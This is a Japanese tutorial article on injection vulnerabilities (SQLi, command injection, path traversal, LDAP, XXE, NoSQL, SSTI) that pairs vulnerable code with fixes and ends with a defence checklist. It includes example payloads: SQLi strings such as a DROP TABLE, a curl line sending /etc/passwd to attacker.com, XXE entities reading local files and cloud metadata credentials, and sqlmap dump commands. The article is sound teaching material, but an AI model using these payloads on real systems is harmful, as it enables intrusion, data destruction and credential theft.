---
title: インジェクション攻撃（SQLi・コマンド・XXE）
category: "概念"
emoji: "💉"
order: 1001
date: "2026-04-09"
series: [Webアプリセキュリティ]
tags: ["セキュリティ", "Webアプリ", "SQLインジェクション", "コマンドインジェクション", "XXE", "OWASP"]
source: "The Web Application Hacker's Handbook（Stuttard & Pinto, 2011）/ OWASP SQL Injection Prevention Cheat Sheet / OWASP Command Injection Defense Cheat Sheet / CWE-89・CWE-78・CWE-611"
---

## インジェクション攻撃の本質

**「データ」として扱われるべき入力値が「コード」として解釈されてしまう脆弱性。**

```
正常なケース:
  入力: alice
  SQL:  SELECT * FROM users WHERE name = 'alice'
        ↑ alice はデータとして扱われる

SQLインジェクション:
  入力: ' OR '1'='1
  SQL:  SELECT * FROM users WHERE name = '' OR '1'='1'
        ↑ 入力値がSQL構文の一部として解釈される → 全件取得
```

インジェクション系脆弱性はすべて「**データとコードの境界が崩れる**」という同じ根本原因を持つ。

---

## SQL インジェクション（SQLi）

### 攻撃の分類

| 種類 | 仕組み | 検知難易度 |
|---|---|---|
| **In-band（古典的）** | エラーや結果がレスポンスに直接現れる | 容易 |
| **Error-based** | DB のエラーメッセージから情報を抽出 | 容易 |
| **Union-based** | UNION SELECT で別テーブルのデータを取得 | 中 |
| **Blind Boolean-based** | 条件の真偽でレスポンスが変わることを利用 | 難 |
| **Blind Time-based** | `SLEEP()` でレスポンス時間から情報を抽出 | 難 |
| **Out-of-band** | DNS・HTTPリクエストでデータを外部送信 | 難 |

### 具体的な攻撃例

```sql
-- 認証バイパス
入力: ' OR '1'='1' --
実行: SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='...'
効果: WHERE 句が常に true になり、最初のユーザーでログインできる

-- UNION ベースでデータ抽出
入力: ' UNION SELECT username, password, NULL FROM users --
実行: SELECT name, price FROM products WHERE id='' UNION SELECT username, password, NULL FROM users --'
効果: users テーブルの全データが製品一覧として返る

-- Blind Time-based（情報が見えない場合）
入力: ' AND SLEEP(5) --
効果: 条件が真なら5秒遅延する → 条件の真偽を1ビットずつ確認して情報を抽出

-- スタックドクエリ（DB次第）
入力: '; DROP TABLE users; --
効果: users テーブルを削除（MySQL・SQL Serverで可能なケースがある）
```

### 対策

#### プリペアドステートメント（最重要）

```python
# 危険: 文字列結合でクエリを構築
query = f"SELECT * FROM users WHERE name = '{user_input}'"
cursor.execute(query)

# 安全: プリペアドステートメント（パラメータ化クエリ）
query = "SELECT * FROM users WHERE name = %s"
cursor.execute(query, (user_input,))
# → user_input は SQL として解釈されずデータとして扱われる
```

```javascript
// Node.js + mysql2
// 危険
const query = `SELECT * FROM users WHERE id = ${req.params.id}`;

// 安全
const [rows] = await db.execute(
  'SELECT * FROM users WHERE id = ?',
  [req.params.id]
);
```

```go
// Go + database/sql
// 安全: ? プレースホルダを使用
row := db.QueryRow("SELECT * FROM users WHERE id = ?", userID)
```

#### ORM の利用（ただし生クエリに注意）

```python
# Django ORM（安全）
User.objects.filter(name=user_input)

# Django の生クエリ（危険: 文字列結合している）
User.objects.raw(f"SELECT * FROM users WHERE name = '{user_input}'")

# Django の生クエリ（安全: パラメータ化）
User.objects.raw("SELECT * FROM users WHERE name = %s", [user_input])
```

#### 最小権限の DB アカウント

```sql
-- アプリ用アカウントに必要最小限の権限のみ付与
CREATE USER 'app_user'@'localhost' IDENTIFIED BY '...';
GRANT SELECT, INSERT, UPDATE ON mydb.orders TO 'app_user'@'localhost';
-- DROP・TRUNCATE・CREATE は付与しない
```

---

## コマンドインジェクション

**OS コマンドにユーザー入力を渡す際に、追加のコマンドを実行させる攻撃。**  
成功すると攻撃者はサーバー上で任意のコマンドを実行できる（RCE: Remote Code Execution）。

### 攻撃例

```python
# 危険: ユーザー入力をシェルに渡す
import subprocess
filename = request.args.get('file')
result = subprocess.run(f"cat /uploads/{filename}", shell=True, capture_output=True)

# 攻撃入力: report.pdf; cat /etc/passwd
# 実行されるコマンド: cat /uploads/report.pdf; cat /etc/passwd
# → /etc/passwd の内容が返る

# さらに危険な入力:
# report.pdf; curl https://attacker.com/$(cat /etc/passwd | base64)
# → パスワードファイルを外部に送信
```

### 主要なシェルメタキャラクター

```bash
;   # コマンドの連結（前のコマンドの成功に関わらず実行）
&&  # 前のコマンドが成功した場合のみ実行
||  # 前のコマンドが失敗した場合のみ実行
|   # パイプ（前のコマンドの出力を次に渡す）
`   # バッククォート（コマンド置換）
$() # コマンド置換
>   # リダイレクト（ファイル上書き）
<   # リダイレクト（ファイル読み込み）
\n  # 改行（一部の環境でコマンド区切り）
```

### 対策

```python
# 安全: shell=False でシェルを介さない（引数をリストで渡す）
import subprocess
filename = request.args.get('file')

# ホワイトリストでファイル名を検証
import re
if not re.match(r'^[\w\-\.]+$', filename):
    return "Invalid filename", 400

result = subprocess.run(
    ["cat", f"/uploads/{filename}"],  # リストで渡す
    shell=False,                       # シェルを介さない
    capture_output=True,
    text=True
)
```

```python
# さらに安全: OS コマンドを使わずライブラリで処理
# ファイル読み取りなら open() を使う
import os
safe_path = os.path.join("/uploads", os.path.basename(filename))
with open(safe_path) as f:
    content = f.read()
```

---

## パストラバーサル（Path Traversal）

**`../` を使ってサーバーの想定外のディレクトリにアクセスする攻撃。**  
コマンドインジェクションと組み合わされることが多い。

```
攻撃入力: ../../etc/passwd
正規化後: /uploads/../../etc/passwd → /etc/passwd

URL エンコードによるバイパス:
  %2e%2e%2f  = ../
  ..%2f      = ../
  %2e%2e/    = ../
```

```python
# 対策: パスを正規化して許可されたベースディレクトリ内か確認
import os

def safe_file_path(base_dir, user_filename):
    # os.path.realpath で .. を解決した絶対パスを取得
    safe_path = os.path.realpath(os.path.join(base_dir, user_filename))
    
    # ベースディレクトリ内に収まっているか確認
    if not safe_path.startswith(os.path.realpath(base_dir)):
        raise ValueError("Path traversal detected")
    
    return safe_path
```

---

## LDAP インジェクション

LDAP ディレクトリへのクエリにユーザー入力を使う場合に発生する。

```python
# 危険
ldap_filter = f"(uid={username})"

# 攻撃入力: admin)(&)
# 構築されるフィルタ: (uid=admin)(&))
# → 認証バイパスが可能になる

# 対策: LDAP 特殊文字のエスケープ
import ldap3
safe_username = ldap3.utils.conv.escape_filter_chars(username)
ldap_filter = f"(uid={safe_username})"
```

---

## XXE（XML External Entity）インジェクション

**XML パーサーに悪意ある外部エンティティを読み込ませ、ファイル読み取りや SSRF を引き起こす。**

### 攻撃例

```xml
<!-- 攻撃者が送信する XML -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>

<!-- /etc/passwd の内容が <name> 要素の値として返ってくる -->

<!-- SSRF への応用 -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<!-- クラウドのメタデータ API から認証情報を窃取 -->
```

### 対策

```python
# Python: defusedxml を使う（標準 xml は XXE に脆弱）
import defusedxml.ElementTree as ET

# 危険
import xml.etree.ElementTree as ET  # 外部エンティティが有効

# 安全
import defusedxml.ElementTree as ET  # 外部エンティティを無効化
tree = ET.parse(xml_file)
```

```java
// Java: 外部エンティティを明示的に無効化
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
DocumentBuilder db = dbf.newDocumentBuilder();
```

---

## NoSQL インジェクション

MongoDB など NoSQL DB へのクエリでもインジェクションは発生する。

```javascript
// 危険: オブジェクトをそのまま渡す
const username = req.body.username;  // 攻撃者が {"$ne": ""} を送信
const user = await User.findOne({ username: username });
// → {username: {"$ne": ""}} → 全ユーザーにマッチ（認証バイパス）

// 安全: 型を検証してから使う
if (typeof req.body.username !== 'string') {
  return res.status(400).json({ error: 'Invalid input' });
}
const user = await User.findOne({ username: req.body.username });
```

---

## テンプレートインジェクション（SSTI）

**テンプレートエンジンにユーザー入力を直接渡すと、テンプレート構文がサーバー側で実行される。**  
RCE につながる重大な脆弱性。

```python
# 危険: Jinja2（Flask）でユーザー入力をテンプレートとして評価
from flask import Flask, request, render_template_string
app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')
    template = f"Hello, {name}!"
    return render_template_string(template)  # ← 危険！

# 攻撃入力: {{7*7}} → "Hello, 49!" が返る（テンプレートが実行された）
# さらに: {{config.items()}} → Flask の設定が漏洩
# RCE: {{''.__class__.__mro__[1].__subclasses__()[...]('id',shell=True,...).communicate()}}

# 安全: 変数として渡す（テンプレート構文として評価しない）
return render_template_string("Hello, {{ name }}!", name=name)
```

---

## sqlmap による検査（ペンテスト目的）

```bash
# 対象 URL の SQLi を自動検査
sqlmap -u "https://example.com/items?id=1" --batch

# POST リクエストのパラメータを検査
sqlmap -u "https://example.com/login" \
  --data="username=test&password=test" \
  --batch

# DB・テーブル・カラムを自動列挙
sqlmap -u "https://example.com/items?id=1" \
  --dbs       # DB 一覧
  --tables    # テーブル一覧
  --dump      # データ取得（許可された環境のみ）
```

---

## チェックリスト

```
□ すべての SQL クエリでプリペアドステートメントを使っている
□ ORM の生クエリ（raw query）で文字列結合をしていない
□ OS コマンド呼び出しで shell=False（引数をリスト形式）を使っている
□ OS コマンドを使わずライブラリで代替できないか検討している
□ ファイルパスの操作で realpath + ベースディレクトリ確認をしている
□ XML パーサーで外部エンティティを無効化している（defusedxml 等）
□ NoSQL クエリのパラメータで型チェックをしている
□ テンプレートにユーザー入力を直接埋め込んでいない
□ DB アカウントに最小権限のみ付与している（DROP・TRUNCATE 不要）
□ エラーメッセージに DB の詳細情報を含めていない
```

---

## 参考文献

- Dafydd Stuttard & Marcus Pinto『The Web Application Hacker's Handbook』（Wiley, 2011）— SQLi・コマンドインジェクションの攻撃手法と対策を体系的に解説
- OWASP SQL Injection Prevention Cheat Sheet（owasp.org）— プリペアドステートメント・ORM の安全な使い方
- OWASP Command Injection Defense Cheat Sheet（owasp.org）— OS コマンド呼び出しの安全なパターン
- CWE-89（SQL Injection）/ CWE-78（OS Command Injection）/ CWE-611（XXE）— 脆弱性の公式定義と事例
- PortSwigger Web Security Academy（portswigger.net/web-security）— 実際に手を動かして学べるインジェクション系の無料ラボ
